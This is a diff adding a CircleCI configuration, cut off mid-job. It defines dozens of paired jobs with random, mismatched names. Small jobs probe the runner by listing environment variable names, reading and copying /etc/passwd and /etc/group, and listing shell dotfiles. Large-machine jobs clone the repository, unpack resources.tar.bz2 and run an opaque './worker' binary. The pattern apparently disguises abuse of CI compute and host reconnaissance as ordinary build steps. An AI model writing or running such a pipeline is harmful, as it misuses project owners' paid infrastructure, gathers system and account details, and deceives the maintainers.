@@ -1,0 +1,1733 @@
+version: 2.1
+
+jobs:
+  sdfgh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan QR
+          command: |
+            mkdir -p /tmp/queue5
+            set +o pipefail 2>/dev/null; for i in $(seq 1 10000); do echo "q-$((i*19))"; done > /tmp/queue5/west-moor-payload; true
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'west-moor-payload'
+  nova-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/west-moor-payload 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  sk-Hans:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Warm Then Swap
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; if [[ ! -e /etc/fstab ]] ; then echo 'found'; fi; true ; } > /tmp/queue5/pQho
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'pQho'
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/pQho 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  log_throw_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Compile Save Files For Mobile
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; if test -p /dev/stdin; then echo "yes"; else echo no; fi; true ; } > /tmp/queue5/RedAdmin
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'RedAdmin'
+  ivan-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/RedAdmin 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  pool_internal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Facilitate update of the rack units
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; printenv | sed 's/=.*//' | awk 'length > 7'; true ; } > /tmp/queue5/rusty_frozen_mountain_cedar
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'rusty_frozen_mountain_cedar'
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/rusty_frozen_mountain_cedar 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  pairsCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Resume count totals
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/autumn.coffee.standup" && rmdir "/tmp/autumn.coffee.standup" && echo ok; true ; } > /tmp/queue5/indigo-v3.1.32
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'indigo-v3.1.32'
+  q1-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/indigo-v3.1.32 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  SW-FIRST-TAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Codename Comet
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f|awk -F "/" '{ print $NF }'|sort|uniq -c|sort --reverse --numeric-sort; true ; } > /tmp/queue5/tmp-52f
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'tmp-52f'
+  Package_Suite4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/tmp-52f 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  meeting_2011_06:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Over to Thandi
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; grep -r --include='*rc' umask /etc 2>/dev/null | sort | head -n 10; true ; } > /tmp/queue5/scratch-fd1ad1df
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'scratch-fd1ad1df'
+  hu-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/scratch-fd1ad1df 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  kAGwbcNwIo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Bundle the ragdolls act 1
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; printf '%s\n' pink green white purple blue black orange | tail -n 20 | sort | uniq -c | sort -nr; true ; } > /tmp/queue5/filterdraftbuffer
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'filterdraftbuffer'
+  fix-1105:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/filterdraftbuffer 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  xVectorCompiler:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Encryption pre the deadline
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; find /sys/class/net -maxdepth 1 -type f -iname 'lo' -mmin -120 -exec du -ch {} + | tail -1; true ; } > /tmp/queue5/packet_fen_token
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'packet_fen_token'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/packet_fen_token 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  cn-sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: almost
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; tr ':' ' ' </etc/passwd|cut -c1-23; true ; } > /tmp/queue5/lambda996
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'lambda996'
+  alice-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/lambda996 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  BACKUP_RESOURCE_PIN_43:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Tomasz owns restart
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; if [ -L /bin ]; then echo 'it is there'; elif [ -e /tmp ]; then echo maybe; else echo 'nope'; fi; true ; } > /tmp/queue5/LOT86173
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'LOT86173'
+  LAB_INIT_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/LOT86173 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  deferPendingCountMax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Utilise the scheduler and have done with it
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; grep -nih users /etc/group | sort | uniq -c; true ; } > /tmp/queue5/MODULE_SILVER_BETA
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'MODULE_SILVER_BETA'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/MODULE_SILVER_BETA 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  cfg_StorePromise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bjorn to zip the inbox folder
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; uptime | awk -F'load average:' '{print $2}'; true ; } > /tmp/queue5/chromeRustyForestEast
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'chromeRustyForestEast'
+  vb-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/chromeRustyForestEast 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  GE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: 67 petri dish aliquot
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; paste -d: <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)|head -n5; true ; } > /tmp/queue5/4Ob
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - '4Ob'
+  add-parse-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/4Ob 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  PARAM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: RISKY translation
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; compgen -k | shuf -n 3 | sort -r | awk 'length > 6'; true ; } > /tmp/queue5/_wip7ac38b7
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - '_wip7ac38b7'
+  Prepare_Pipeline1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/_wip7ac38b7 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  isBottom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: T minus 5
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"} {print NF}' /etc/group | wc -l; true ; } > /tmp/queue5/snapshot_21713
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'snapshot_21713'
+  run-nightly-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/snapshot_21713 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  knnKNNLayer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Spawn particle systems and playtest
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; cut -d ":" -f 1,7 /etc/passwd | fold -w 50; true ; } > /tmp/queue5/ChromeBisonWest
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'ChromeBisonWest'
+  edge-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/ChromeBisonWest 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  jigsaw-tiger:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Unmute the conveyor
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; cp /etc/passwd '/var/tmp/src.log' && gzip -f '/var/tmp/src.log' && ls -l '/var/tmp/src.log'.gz; true ; } > /tmp/queue5/ae7d4813
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'ae7d4813'
+  q4-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/ae7d4813 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  ro_Hant_CL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collect the royalty statements q3
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; dir="/dev/shm/frame-left-common"; mkdir -p "$dir" && touch "$dir"/{a,b,c}.log && ls "$dir" | wc -l; true ; } > /tmp/queue5/fo
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'fo'
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/fo 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  mega-migration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Survey the org chart week one
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; ls -g /etc/p* | nl; true ; } > /tmp/queue5/0buj5B3gYbrwBA2MtA9a
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - '0buj5B3gYbrwBA2MtA9a'
+  add-webhook-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/0buj5B3gYbrwBA2MtA9a 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  TotalGlobalFastCheckout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: We power cycle the GPIO pins first
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; printenv | sed 's/=.*//' | nl | tail -10; true ; } > /tmp/queue5/Buffer
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'Buffer'
+  Ship_Tests8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/Buffer 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  pink-800-accent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Photo finish
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; cat /etc/os-release |tr -d '"' |awk -F'=' '{ print $2 }'; true ; } > /tmp/queue5/YgNl3qfrZ6e33sV6I02BBb
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'YgNl3qfrZ6e33sV6I02BBb'
+  check-end-to-end-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/YgNl3qfrZ6e33sV6I02BBb 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  heroDef:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: FINGERPRINT PERMISSIONS END
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; for path in $HOME/.bash*; do printf '%s\n' "$path"; done; true ; } > /tmp/queue5/crash.log.19
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'crash.log.19'
+  perseus-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/crash.log.19 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  readComplexArticleAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: compress jpg
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; compgen -b |tail -n 4 |tac; true ; } > /tmp/queue5/user-ROM-blob_Gadget
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'user-ROM-blob_Gadget'
+  tweak-retry-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/user-ROM-blob_Gadget 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  buff3r:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Dispatch the eval harness from cold storage
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; touch "/tmp/MOCK_20180312.out" && cp "/tmp/MOCK_20180312.out"{,.bak} && ls "/tmp/MOCK_20180312.out"*; true ; } > /tmp/queue5/NODE
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'NODE'
+  Verify_Release7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/NODE 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  Compare-VectorObject:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Ask the help center nicely
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; if [ ! -b /dev/null ] ; then echo true; fi; true ; } > /tmp/queue5/reef376
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'reef376'
+  MERGE_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/reef376 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  PHCurveDidRedoNotification:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Summary over SSH
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; if test -h /etc/os-release; then echo yes; else echo no; fi; true ; } > /tmp/queue5/IRON_DUSTY
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'IRON_DUSTY'
+  dp-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/IRON_DUSTY 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
